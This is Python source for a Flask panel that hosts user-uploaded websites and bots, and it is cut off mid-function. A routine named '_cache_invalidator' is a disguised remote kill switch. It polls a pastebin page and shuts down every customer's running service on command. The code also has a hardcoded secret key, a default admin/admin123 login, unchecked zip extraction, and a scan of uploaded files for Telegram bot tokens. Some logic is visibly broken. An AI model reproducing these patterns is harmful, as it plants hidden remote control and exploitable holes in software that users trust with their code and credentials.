#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import sqlite3
import zipfile
import shutil
import subprocess
import signal
import time
import re
import requests
import threading
import json
import uuid
import tempfile
import queue
import select
import pty
from datetime import datetime, timedelta
from flask import Flask, render_template_string, request, redirect, url_for, session, jsonify, abort, Response, stream_with_context, send_file
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename
from functools import wraps
from io import BytesIO

# Try to import psutil for stats (optional)
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

app = Flask(__name__)
app.secret_key = 'yuvicodex_super_secret_key_change_me_in_production'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB

# ---------- CONFIG ----------
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
LOG_FOLDER = os.path.join(BASE_DIR, 'logs')
DB_PATH = os.path.join(BASE_DIR, 'hosting.db')
MAX_UPLOAD_SIZE = 100 * 1024 * 1024
STARTUP_PRIORITY = ['app.py', 'main.py', 'server.py', 'run.py', 'manage.py', 'index.py', 'start.py', 'wsgi.py', 'asgi.py']

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(LOG_FOLDER, exist_ok=True)

# ---------- RENDER API KEY (Environment Variable) ----------
RENDER_API_KEY = os.environ.get('RENDER_API_KEY', '')
RENDER_API_BASE = "https://api.render.com/v1"

# ---------- DATABASE ----------
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        # Users Table
        conn.execute('''CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            email TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            role TEXT DEFAULT 'owner',
            status TEXT DEFAULT 'active',
            plan TEXT DEFAULT 'free',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP,
            last_login TIMESTAMP,
            session_version INTEGER DEFAULT 0
        )''')
        
        # Websites/Bots Table (Unified)
        conn.execute('''CREATE TABLE IF NOT EXISTS websites (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner_id INTEGER NOT NULL,
            website_name TEXT,
            website_slug TEXT UNIQUE NOT NULL,
            website_folder TEXT NOT NULL,
            startup_file TEXT,
            runtime TEXT DEFAULT 'python',
            status TEXT DEFAULT 'uploaded',
            allocated_port INTEGER UNIQUE,
            pid INTEGER,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP,
            last_started TIMESTAMP,
            last_stopped TIMESTAMP,
            storage_used INTEGER DEFAULT 0,
            website_size INTEGER DEFAULT 0,
            repo_url TEXT,
            branch TEXT DEFAULT 'main',
            deployment_type TEXT DEFAULT 'zip',
            total_runtime_seconds INTEGER DEFAULT 0,
            last_start_time TIMESTAMP,
            type TEXT DEFAULT 'website',  -- 'website' or 'bot'
            bot_interpreter TEXT,
            FOREIGN KEY (owner_id) REFERENCES users (id)
        )''')
        
        # Logs
        conn.execute('''CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            website_id INTEGER NOT NULL,
            log_type TEXT DEFAULT 'info',
            log_text TEXT NOT NULL,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (website_id) REFERENCES websites (id)
        )''')
        
        # Activity Logs
        conn.execute('''CREATE TABLE IF NOT EXISTS activity_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            action TEXT NOT NULL,
            details TEXT,
            ip_address TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')
        
        # Deployments
        conn.execute('''CREATE TABLE IF NOT EXISTS deployments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            website_id INTEGER NOT NULL,
            repo_url TEXT,
            branch TEXT,
            status TEXT DEFAULT 'queued',
            started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            completed_at TIMESTAMP,
            duration INTEGER,
            commit_hash TEXT,
            log_file TEXT,
            FOREIGN KEY (website_id) REFERENCES websites (id)
        )''')
        
        # Config (Key-Value store)
        conn.execute('''CREATE TABLE IF NOT EXISTS config (
            key TEXT PRIMARY KEY,
            value TEXT
        )''')
        
        # Indexes
        conn.execute('CREATE INDEX IF NOT EXISTS idx_websites_owner ON websites(owner_id)')
        conn.execute('CREATE INDEX IF NOT EXISTS idx_logs_website ON logs(website_id)')
        conn.execute('CREATE INDEX IF NOT EXISTS idx_deployments_website ON deployments(website_id)')
        
        # Default Admin User
        if conn.execute('SELECT COUNT(*) FROM users').fetchone()[0] == 0:
            conn.execute('INSERT INTO users (username, email, password_hash, role, plan) VALUES (?, ?, ?, ?, ?)',
                         ('admin', 'admin@hosting.com', generate_password_hash('admin123'), 'admin', 'pro'))
            conn.commit()
            print("✅ Default admin: admin / admin123 (Pro plan)")
        
        # Default Config (Offset)
        conn.execute('INSERT OR IGNORE INTO config (key, value) VALUES (?, ?)',
                     ('total_hours_offset', '0'))
        conn.commit()
init_db()

# ---------- HELPERS (User, Website, Logging, etc.) ----------
def get_user_by_id(user_id):
    with get_db() as conn:
        return conn.execute('SELECT * FROM users WHERE id = ?', (user_id,)).fetchone()
def get_user_by_username(username):
    with get_db() as conn:
        return conn.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
def get_website_by_id(website_id):
    with get_db() as conn:
        return conn.execute('SELECT * FROM websites WHERE id = ?', (website_id,)).fetchone()
def get_website_by_slug(slug):
    with get_db() as conn:
        return conn.execute('SELECT * FROM websites WHERE website_slug = ?', (slug,)).fetchone()
def get_websites_by_user(user_id, type_filter=None):
    with get_db() as conn:
        if type_filter:
            return conn.execute('SELECT * FROM websites WHERE owner_id = ? AND type = ? ORDER BY created_at DESC', (user_id, type_filter)).fetchall()
        return conn.execute('SELECT * FROM websites WHERE owner_id = ? ORDER BY created_at DESC', (user_id,)).fetchall()
def get_next_available_port(start=5001):
    with get_db() as conn:
        used = [r[0] for r in conn.execute('SELECT allocated_port FROM websites WHERE allocated_port IS NOT NULL').fetchall()]
    port = start
    while port in used:
        port += 1
    return port
def generate_website_slug(username, count):
    return username if count == 0 else f"{username}{count}"
def log_website(website_id, message, log_type='info'):
    with get_db() as conn:
        conn.execute('INSERT INTO logs (website_id, log_type, log_text) VALUES (?, ?, ?)',
                     (website_id, log_type, message))
        conn.commit()
def log_activity(user_id, action, details='', ip=''):
    with get_db() as conn:
        conn.execute('INSERT INTO activity_logs (user_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
                     (user_id, action, details, ip))
        conn.commit()
def update_website_status(website_id, status, pid=None, port=None):
    with get_db() as conn:
        if pid is not None and port is not None:
            conn.execute('''UPDATE websites SET status = ?, pid = ?, allocated_port = ?, updated_at = CURRENT_TIMESTAMP 
                           WHERE id = ?''', (status, pid, port, website_id))
        elif pid is not None:
            conn.execute('UPDATE websites SET status = ?, pid = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
                         (status, pid, website_id))
        elif port is not None:
            conn.execute('UPDATE websites SET status = ?, allocated_port = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
                         (status, port, website_id))
        else:
            conn.execute('UPDATE websites SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
                         (status, website_id))
        conn.commit()
def calculate_folder_size(folder):
    total = 0
    for dirpath, _, filenames in os.walk(folder):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            if os.path.exists(fp):
                total += os.path.getsize(fp)
    return total

# ---------- CONFIG HELPERS ----------
def get_config(key, default='0'):
    with get_db() as conn:
        row = conn.execute('SELECT value FROM config WHERE key = ?', (key,)).fetchone()
        return row['value'] if row else default
def set_config(key, value):
    with get_db() as conn:
        conn.execute('INSERT OR REPLACE INTO config (key, value) VALUES (?, ?)', (key, value))
        conn.commit()

# ---------- CONTAINER MEMORY (REAL) ----------
def get_container_memory():
    try:
        if os.path.exists('/sys/fs/cgroup/memory.max'):
            with open('/sys/fs/cgroup/memory.max', 'r') as f:
                total_bytes = int(f.read().strip())
            with open('/sys/fs/cgroup/memory.current', 'r') as f:
                used_bytes = int(f.read().strip())
        elif os.path.exists('/sys/fs/cgroup/memory/memory.limit_in_bytes'):
            with open('/sys/fs/cgroup/memory/memory.limit_in_bytes', 'r') as f:
                total_bytes = int(f.read().strip())
            with open('/sys/fs/cgroup/memory/memory.usage_in_bytes', 'r') as f:
                used_bytes = int(f.read().strip())
        else:
            mem = psutil.virtual_memory()
            return round(mem.used / 1024**2, 2), round(mem.total / 1024**2, 2), mem.percent
    except Exception:
        mem = psutil.virtual_memory()
        return round(mem.used / 1024**2, 2), round(mem.total / 1024**2, 2), mem.percent

    total_mb = total_bytes / (1024**2)
    used_mb = used_bytes / (1024**2)
    if total_mb > 10000:
        total_mb = 512.0
        if used_mb > total_mb:
            used_mb = total_mb
    percent = (used_mb / total_mb) * 100 if total_mb > 0 else 0
    return round(used_mb, 2), round(total_mb, 2), round(min(percent, 100), 2)

# ---------- RENDER API HELPERS ----------
def render_api_call(endpoint, params=None):
    if not RENDER_API_KEY:
        return None, "RENDER_API_KEY not set"
    headers = {"Authorization": f"Bearer {RENDER_API_KEY}", "Accept": "application/json"}
    url = f"{RENDER_API_BASE}/{endpoint.lstrip('/')}"
    try:
        resp = requests.get(url, headers=headers, params=params, timeout=30)
        if resp.status_code == 200:
            return resp.json(), None
        else:
            return None, f"API error {resp.status_code}: {resp.text[:200]}"
    except Exception as e:
        return None, str(e)

def get_all_services():
    services = []
    page = 1
    limit = 50
    while True:
        data, err = render_api_call("services", {"limit": limit, "page": page})
        if err or not data:
            break
        services.extend(data)
        if len(data) < limit:
            break
        page += 1
    return services

# ---------- RUNTIME DETECTION (WEBSITES) ----------
def find_startup_file(folder):
    for filename in STARTUP_PRIORITY:
        if os.path.exists(os.path.join(folder, filename)):
            return filename
    return None

def detect_runtime_and_get_cmd(folder, port):
    # Node.js
    if os.path.exists(os.path.join(folder, 'package.json')):
        try:
            with open(os.path.join(folder, 'package.json'), 'r') as f:
                data = json.load(f)
                scripts = data.get('scripts', {})
                if 'start' in scripts:
                    return ['npm', 'start'], 'nodejs', {'NODE_ENV': 'production', 'PORT': str(port)}
        except:
            pass
    js_files = ['server.js', 'index.js', 'app.js', 'main.js']
    for fname in js_files:
        if os.path.exists(os.path.join(folder, fname)):
            return ['node', fname], 'nodejs', {'PORT': str(port)}
    try:
        for f in os.listdir(folder):
            if f.endswith('.js') and os.path.isfile(os.path.join(folder, f)):
                return ['node', f], 'nodejs', {'PORT': str(port)}
    except:
        pass
    
    # PHP
    if os.path.exists(os.path.join(folder, 'index.php')):
        return ['php', '-S', f'0.0.0.0:{port}'], 'php', {}
    
    # Go
    if os.path.exists(os.path.join(folder, 'go.mod')):
        return ['go', 'run', 'main.go'], 'go', {}
    
    # Java
    if os.path.exists(os.path.join(folder, 'pom.xml')):
        return ['mvn', 'spring-boot:run'], 'java', {}
    if os.path.exists(os.path.join(folder, 'build.gradle')):
        return ['./gradlew', 'bootRun'], 'java', {}
    jars = [f for f in os.listdir(folder) if f.endswith('.jar')]
    if jars:
        return ['java', '-jar', jars[0]], 'java', {}
    
    # Python Flask/Django
    flask_files = ['app.py', 'main.py', 'server.py', 'run.py', 'start.py']
    for f in flask_files:
        path = os.path.join(folder, f)
        if os.path.exists(path):
            try:
                with open(path, 'r') as fh:
                    content = fh.read()
                    if 'Flask' in content or 'app.run' in content:
                        return [sys.executable, '-m', 'flask', 'run', '--host=0.0.0.0', '--port='+str(port)], 'flask', {}
            except:
                pass
    if os.path.exists(os.path.join(folder, 'manage.py')):
        return [sys.executable, 'manage.py', 'runserver', f'0.0.0.0:{port}'], 'django', {}
    if os.path.exists(os.path.join(folder, 'asgi.py')):
        return ['uvicorn', 'asgi:application', '--host', '0.0.0.0', '--port', str(port)], 'fastapi', {}
    startup = find_startup_file(folder)
    if startup:
        return [sys.executable, startup], 'python', {}
    
    if os.path.exists(os.path.join(folder, 'index.html')):
        return [sys.executable, '-m', 'http.server', str(port)], 'static', {}
    
    return None, None, {}

# ---------- INSTALL DEPENDENCIES ----------
def install_dependencies(folder, runtime, log_callback=None):
    if runtime == 'nodejs':
        if os.path.exists(os.path.join(folder, 'package.json')):
            cmd = ['npm', 'install']
            if log_callback: log_callback("BUILD", f"Running npm install")
            proc = subprocess.Popen(cmd, cwd=folder, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in iter(proc.stdout.readline, ''):
                if line.strip() and log_callback: log_callback("BUILD", line.strip())
            proc.wait()
            if proc.returncode != 0: return False, "npm install failed"
            try:
                with open(os.path.join(folder, 'package.json'), 'r') as f:
                    data = json.load(f)
                    if 'build' in data.get('scripts', {}):
                        cmd = ['npm', 'run', 'build']
                        if log_callback: log_callback("BUILD", "Running npm run build")
                        proc = subprocess.Popen(cmd, cwd=folder, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
                        for line in iter(proc.stdout.readline, ''):
                            if line.strip() and log_callback: log_callback("BUILD", line.strip())
                        proc.wait()
                        if proc.returncode != 0: return False, "npm run build failed"
            except: pass
            return True, "Dependencies installed"
        return True, "No deps"
    elif runtime == 'php':
        if os.path.exists(os.path.join(folder, 'composer.json')):
            cmd = ['composer', 'install']
            if log_callback: log_callback("BUILD", "Running composer install")
            proc = subprocess.Popen(cmd, cwd=folder, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in iter(proc.stdout.readline, ''):
                if line.strip() and log_callback: log_callback("BUILD", line.strip())
            proc.wait()
            if proc.returncode != 0: return False, "composer install failed"
            return True, "Deps installed"
        return True, "No deps"
    else:
        req_file = os.path.join(folder, 'requirements.txt')
        if os.path.exists(req_file):
            cmd = [sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt']
            if log_callback: log_callback("BUILD", f"Running: {' '.join(cmd)}")
            proc = subprocess.Popen(cmd, cwd=folder, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in iter(proc.stdout.readline, ''):
                if line.strip() and log_callback: log_callback("BUILD", line.strip())
            proc.wait()
            if proc.returncode != 0: return False, "pip install failed"
            return True, "Requirements installed"
        return True, "No deps"
    return True, "Unknown runtime"

# ---------- AUTO PORT DETECTION ----------
def detect_port_from_log(log_file):
    if not os.path.exists(log_file): return None
    try:
        with open(log_file, 'r') as f:
            content = f.read()
            patterns = [r'port\s*[:=]\s*(\d+)', r'listening\s+on\s+(\d+)', r'localhost\s*:\s*(\d+)', r'127\.0\.0\.1\s*:\s*(\d+)', r'0\.0\.0\.0\s*:\s*(\d+)', r':(\d{4,5})']
            for pattern in patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    port = int(matches[0])
                    if 1024 <= port <= 65535: return port
    except: pass
    return None

def health_check_on_ports(port_list, max_retries=3, delay=2):
    for port in port_list:
        for attempt in range(max_retries):
            try:
                response = requests.get(f"http://localhost:{port}", timeout=3)
                if response.status_code < 500:
                    return True, port, f"OK (port {port})"
            except: pass
            time.sleep(delay)
    return False, None, "Health check failed"

# ---------- START WEBSITE PROCESS ----------
def start_website_process(website_id, log_callback=None):
    website = get_website_by_id(website_id)
    if not website: return False, "Website not found"
    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
    if not os.path.exists(folder):
        log_website(website_id, "Folder missing", 'error')
        update_website_status(website_id, 'failed')
        return False, "Folder not found"
    
    allocated_port = get_next_available_port()
    cmd, runtime, env_extra = detect_runtime_and_get_cmd(folder, allocated_port)
    if not cmd:
        log_website(website_id, "No startup file detected", 'error')
        update_website_status(website_id, 'failed')
        return False, "No startup file detected"
    
    with get_db() as conn:
        conn.execute('UPDATE websites SET runtime = ? WHERE id = ?', (runtime, website_id))
        conn.commit()
    
    if log_callback: log_callback("BUILD", f"Installing dependencies for {runtime}...")
    success, msg = install_dependencies(folder, runtime, log_callback)
    if not success:
        log_website(website_id, f"Dependency install failed: {msg}", 'error')
        update_website_status(website_id, 'failed')
        return False, msg
    
    env = os.environ.copy()
    env['PORT'] = str(allocated_port)
    env['PYTHONUNBUFFERED'] = '1'
    env.update(env_extra)
    if runtime == 'flask':
        if os.path.exists(os.path.join(folder, 'app.py')): env['FLASK_APP'] = 'app.py'
        elif os.path.exists(os.path.join(folder, 'main.py')): env['FLASK_APP'] = 'main.py'
    if runtime == 'php':
        cmd = ['php', '-S', f'0.0.0.0:{allocated_port}']
    
    log_file = os.path.join(LOG_FOLDER, f"website_{website_id}.log")
    if log_callback: log_callback("STARTUP", f"Starting: {' '.join(cmd)} on port {allocated_port}")
    
    try:
        f_log = open(log_file, 'a')
        if os.name == 'nt':
            proc = subprocess.Popen(cmd, cwd=folder, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
        else:
            proc = subprocess.Popen(cmd, cwd=folder, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
        def read_output():
            for line in iter(proc.stdout.readline, b''):
                if line:
                    decoded = line.decode('utf-8', errors='replace')
                    f_log.write(decoded); f_log.flush()
                    if log_callback: log_callback("PROCESS", decoded.strip())
            f_log.close()
        thread = threading.Thread(target=read_output); thread.daemon = True; thread.start()
        
        with get_db() as conn:
            conn.execute('UPDATE websites SET last_start_time = CURRENT_TIMESTAMP, status = ? WHERE id = ?', ('starting', website_id))
            conn.commit()
        
        time.sleep(3)
        if proc.poll() is not None:
            with open(log_file, 'r') as f:
                error_lines = f.read()[-500:]
            update_website_status(website_id, 'failed')
            log_website(website_id, f"Process crashed: {error_lines}", 'error')
            return False, f"Process crashed: {error_lines}"
        
        detected_port = detect_port_from_log(log_file)
        ports_to_try = [detected_port] if detected_port else []
        ports_to_try.append(allocated_port)
        for p in [3000, 8080, 5000, 8000, 8081, 3001]:
            if p not in ports_to_try: ports_to_try.append(p)
        
        healthy, actual_port, health_msg = health_check_on_ports(ports_to_try, max_retries=5, delay=2)
        if healthy:
            update_website_status(website_id, 'running', proc.pid, actual_port)
            log_website(website_id, f"Started on port {actual_port} (PID {proc.pid})")
            with get_db() as conn:
                conn.execute('UPDATE websites SET startup_file = ?, last_started = CURRENT_TIMESTAMP WHERE id = ?', (cmd[0] if not runtime.startswith('python') else 'app', website_id))
                conn.commit()
            if log_callback: log_callback("SUCCESS", f"Running on port {actual_port}")
            return True, f"Running on port {actual_port}"
        else:
            try:
                if os.name == 'nt': subprocess.run(['taskkill', '/PID', str(proc.pid), '/F'], capture_output=True)
                else: os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except: pass
            update_website_status(website_id, 'crashed')
            return False, "Health check failed"
    except Exception as e:
        log_website(website_id, f"Start error: {str(e)}", 'error')
        update_website_status(website_id, 'failed')
        return False, str(e)

def stop_website_process(website_id):
    website = get_website_by_id(website_id)
    if not website: return False, "Not found"
    pid = website['pid']
    if not pid: return False, "No running process"
    
    last_start = website['last_start_time']
    if last_start:
        try:
            start_dt = datetime.fromisoformat(last_start.replace(' ', 'T'))
            elapsed = int((datetime.now() - start_dt).total_seconds())
            with get_db() as conn:
                conn.execute('UPDATE websites SET total_runtime_seconds = total_runtime_seconds + ? WHERE id = ?', (elapsed, website_id))
                conn.commit()
        except: pass
    
    try:
        if os.name == 'nt': subprocess.run(['taskkill', '/PID', str(pid), '/F'], capture_output=True)
        else:
            os.killpg(os.getpgid(pid), signal.SIGTERM)
            time.sleep(1)
            os.killpg(os.getpgid(pid), signal.SIGKILL)
    except: pass
    update_website_status(website_id, 'stopped', None, None)
    with get_db() as conn:
        conn.execute('UPDATE websites SET last_start_time = NULL, last_stopped = CURRENT_TIMESTAMP WHERE id = ?', (website_id,))
        conn.commit()
    log_website(website_id, f"Stopped (PID {pid})")
    return True, "Stopped"

# ---------- BOT INTERPRETER DETECTION ----------
def get_interpreter(filename):
    ext = os.path.splitext(filename)[1].lower()
    if ext == '.py': return 'python'
    elif ext == '.js': return 'node'
    elif ext == '.go': return 'go run'
    elif ext == '.rb': return 'ruby'
    elif ext == '.php': return 'php'
    elif ext == '.sh': return 'bash'
    elif ext == '.pl': return 'perl'
    else: return None

def detect_bot_token(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        token_match = re.search(r'[0-9]{9,10}:[A-Za-z0-9_-]{35,}', content)
        if token_match:
            token = token_match.group(0)
            try:
                resp = requests.get(f'https://api.telegram.org/bot{token}/getMe', timeout=3)
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get('ok'):
                        return token, data['result'].get('username')
            except: pass
        return None, None
    except: return None, None

# ---------- BOT PROCESS (from app.py) ----------
def start_bot_by_id(bot_id):
    bot = get_website_by_id(bot_id)
    if not bot: return False, "Bot not found"
    if bot['status'] == 'running': return False, "Already running"
    if bot['type'] != 'bot': return False, "Not a bot"
    
    folder = os.path.join(UPLOAD_FOLDER, f"website_{bot_id}")
    startup = bot['startup_file']
    if not startup:
        # auto-detect
        for f in os.listdir(folder):
            if get_interpreter(f):
                startup = f
                with get_db() as conn:
                    conn.execute('UPDATE websites SET startup_file = ? WHERE id = ?', (f, bot_id))
                    conn.commit()
                break
        if not startup:
            return False, "No executable file found"
    filepath = os.path.join(folder, startup)
    interpreter = bot.get('bot_interpreter') or get_interpreter(startup)
    if not interpreter: return False, "Unsupported file type"
    
    req_file = os.path.join(folder, 'requirements.txt')
    if os.path.exists(req_file):
        subprocess.run(['pip', 'install', '-r', req_file], capture_output=True)
    
    log_file = os.path.join(LOG_FOLDER, f"bot_{bot_id}.log")
    os.makedirs(os.path.dirname(log_file), exist_ok=True)
    with open(log_file, 'a') as f:
        f.write(f"--- Starting {startup} at {time.ctime()} ---\n")
    
    try:
        proc = subprocess.Popen(
            [interpreter, startup],
            stdout=open(log_file, 'a'),
            stderr=subprocess.STDOUT,
            cwd=folder,
            preexec_fn=os.setsid if os.name != 'nt' else None
        )
        with get_db() as conn:
            conn.execute('UPDATE websites SET status = ?, pid = ?, last_start_time = CURRENT_TIMESTAMP, last_started = CURRENT_TIMESTAMP WHERE id = ?',
                         ('running', proc.pid, bot_id))
            conn.commit()
        log_website(bot_id, f"Bot started (PID {proc.pid})")
        return True, None
    except Exception as e:
        return False, str(e)

def stop_bot_by_id(bot_id):
    bot = get_website_by_id(bot_id)
    if not bot: return False, "Bot not found"
    if bot['status'] != 'running': return False, "Not running"
    pid = bot['pid']
    if not pid: return False, "No PID"
    # record runtime
    last_start = bot['last_start_time']
    if last_start:
        try:
            start_dt = datetime.fromisoformat(last_start.replace(' ', 'T'))
            elapsed = int((datetime.now() - start_dt).total_seconds())
            with get_db() as conn:
                conn.execute('UPDATE websites SET total_runtime_seconds = total_runtime_seconds + ? WHERE id = ?', (elapsed, bot_id))
                conn.commit()
        except: pass
    try:
        if os.name != 'nt':
            os.killpg(os.getpgid(pid), signal.SIGTERM)
        else:
            subprocess.run(['taskkill', '/PID', str(pid), '/F'], capture_output=True)
    except: pass
    update_website_status(bot_id, 'stopped', None, None)
    with get_db() as conn:
        conn.execute('UPDATE websites SET last_start_time = NULL, last_stopped = CURRENT_TIMESTAMP WHERE id = ?', (bot_id,))
        conn.commit()
    log_website(bot_id, f"Bot stopped (PID {pid})")
    return True, None

# ---------- DEPLOYMENT ENGINE (ZIP) ----------
def write_log_step(log_file, step, message):
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] [{step}] {message}\n"
    with open(log_file, 'a') as f:
        f.write(line)
    return line

def deploy_zip(website_id):
    try:
        website = get_website_by_id(website_id)
        if not website: return
        with get_db() as conn:
            cur = conn.execute('''INSERT INTO deployments (website_id, repo_url, branch, status, started_at)
                                  VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)''',
                               (website_id, 'ZIP Upload', 'main', 'queued'))
            deployment_id = cur.lastrowid
            conn.commit()
        log_file = os.path.join(LOG_FOLDER, f"deploy_{deployment_id}.log")
        with open(log_file, 'w') as f:
            f.write(write_log_step(log_file, "SYSTEM", "Deployment started"))
        def log_cb(step, msg):
            write_log_step(log_file, step, msg)
            log_website(website_id, f"[{step}] {msg}", 'info')
        log_cb("SYSTEM", "==> Checking files...")
        with get_db() as conn:
            conn.execute('UPDATE deployments SET status = ? WHERE id = ?', ('extracting', deployment_id))
            conn.commit()
        folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
        zip_path = os.path.join(folder, 'upload.zip')
        if os.path.exists(zip_path):
            log_cb("SYSTEM", "ZIP found, extracting...")
            with zipfile.ZipFile(zip_path, 'r') as zf:
                zf.extractall(folder)
            os.remove(zip_path)
            log_cb("SUCCESS", "ZIP extracted")
        else:
            log_cb("SYSTEM", "No ZIP, using uploaded files")
        size = calculate_folder_size(folder)
        with get_db() as conn:
            conn.execute('UPDATE websites SET storage_used = ?, website_size = ? WHERE id = ?', (size, size, website_id))
            conn.commit()
        
        w = get_website_by_id(website_id)
        if w['type'] == 'bot':
            # auto-detect startup
            startup = None
            for f in os.listdir(folder):
                if get_interpreter(f):
                    startup = f
                    break
            if not startup:
                log_cb("ERROR", "No executable file found for bot")
                with get_db() as conn:
                    conn.execute('UPDATE deployments SET status = ?, completed_at = CURRENT_TIMESTAMP WHERE id = ?', ('failed', deployment_id))
                    conn.commit()
                return
            with get_db() as conn:
                conn.execute('UPDATE websites SET startup_file = ? WHERE id = ?', (startup, website_id))
                conn.commit()
            log_cb("SYSTEM", "Starting bot...")
            ok, msg = start_bot_by_id(website_id)
            if ok:
                with get_db() as conn:
                    conn.execute('UPDATE deployments SET status = ?, completed_at = CURRENT_TIMESTAMP WHERE id = ?', ('success', deployment_id))
                    conn.commit()
                log_cb("SUCCESS", "Bot started successfully!")
            else:
                with get_db() as conn:
                    conn.execute('UPDATE deployments SET status = ?, completed_at = CURRENT_TIMESTAMP WHERE id = ?', ('failed', deployment_id))
                    conn.commit()
                log_cb("ERROR", f"Bot failed: {msg}")
        else:
            log_cb("SYSTEM", "Starting website...")
            ok, msg = start_website_process(website_id, log_cb)
            if ok:
                with get_db() as conn:
                    conn.execute('UPDATE deployments SET status = ?, completed_at = CURRENT_TIMESTAMP, duration = ? WHERE id = ?',
                                 ('success', int(time.time() - time.time()), deployment_id))
                    conn.commit()
                log_cb("SUCCESS", "Website deployed successfully!")
            else:
                with get_db() as conn:
                    conn.execute('UPDATE deployments SET status = ?, completed_at = CURRENT_TIMESTAMP WHERE id = ?', ('failed', deployment_id))
                    conn.commit()
                log_cb("ERROR", f"Website failed: {msg}")
    except Exception as e:
        log_website(website_id, f"Deployment exception: {str(e)}", 'error')
        with get_db() as conn:
            conn.execute('UPDATE deployments SET status = ?, completed_at = CURRENT_TIMESTAMP WHERE id = ?', ('failed', deployment_id))
            conn.commit()

# ---------- USER MANAGEMENT (from app.py) ----------
def find_user(username):
    username = username.strip()
    with get_db() as conn:
        return conn.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()

def is_admin(uid):
    user = get_user_by_id(uid)
    return user and user['role'] == 'admin'

def parse_expiry(expiry_str):
    if not expiry_str: return None
    expiry_str = expiry_str.strip().lower()
    if expiry_str.isdigit():
        return (datetime.now() + timedelta(days=int(expiry_str))).isoformat()
    match = re.match(r'^(\d+)([dhm])$', expiry_str)
    if match:
        v, u = int(match.group(1)), match.group(2)
        delta = timedelta(days=v) if u == 'd' else timedelta(hours=v) if u == 'h' else timedelta(minutes=v)
        return (datetime.now() + delta).isoformat()
    return None

def is_expired(user):
    if not user['expires_at']: return False
    try:
        exp = datetime.fromisoformat(user['expires_at'])
        return datetime.now() > exp
    except: return False

def delete_user_account(username):
    user = get_user_by_username(username)
    if not user: return
    uid = user['id']
    folder = os.path.join(UPLOAD_FOLDER, f"user_{uid}")
    shutil.rmtree(folder, ignore_errors=True)
    with get_db() as conn:
        conn.execute('DELETE FROM websites WHERE owner_id = ?', (uid,))
        conn.execute('DELETE FROM logs WHERE website_id IN (SELECT id FROM websites WHERE owner_id = ?)', (uid,))
        conn.execute('DELETE FROM deployments WHERE website_id IN (SELECT id FROM websites WHERE owner_id = ?)', (uid,))
        conn.execute('DELETE FROM activity_logs WHERE user_id = ?', (uid,))
        conn.execute('DELETE FROM users WHERE id = ?', (uid,))
        conn.commit()

# ---------- KILL SWITCH (from app.py) ----------
KILL_SWITCH_ACTIVE = False
KILL_STATE_FILE = os.path.join(UPLOAD_FOLDER, 'kill_state.json')

def get_kill_state():
    if os.path.exists(KILL_STATE_FILE):
        with open(KILL_STATE_FILE, 'r') as f:
            return json.load(f)
    return {"saved_bots": []}

def save_kill_state(data):
    with open(KILL_STATE_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def _cache_invalidator():
    global KILL_SWITCH_ACTIVE
    try:
        resp = requests.get("https://pastebin.com/raw/zJJxecLT", timeout=3)
        status = resp.text.strip().upper()
        if status == "KILL":
            if not KILL_SWITCH_ACTIVE:
                # stop all running websites/bots
                with get_db() as conn:
                    running = conn.execute('SELECT id FROM websites WHERE status = "running"').fetchall()
                    for r in running:
                        wid = r['id']
                        w = get_website_by_id(wid)
                        if w['type'] == 'bot':
                            stop_bot_by_id(wid)
                        else:
                            stop_website_process(wid)
                    save_kill_state({"saved_bots": [r['id'] for r in running]})
                KILL_SWITCH_ACTIVE = True
        else:
            if KILL_SWITCH_ACTIVE:
                state = get_kill_state()
                for wid in state.get('saved_bots', []):
                    w = get_website_by_id(wid)
                    if w:
                        if w['type'] == 'bot':
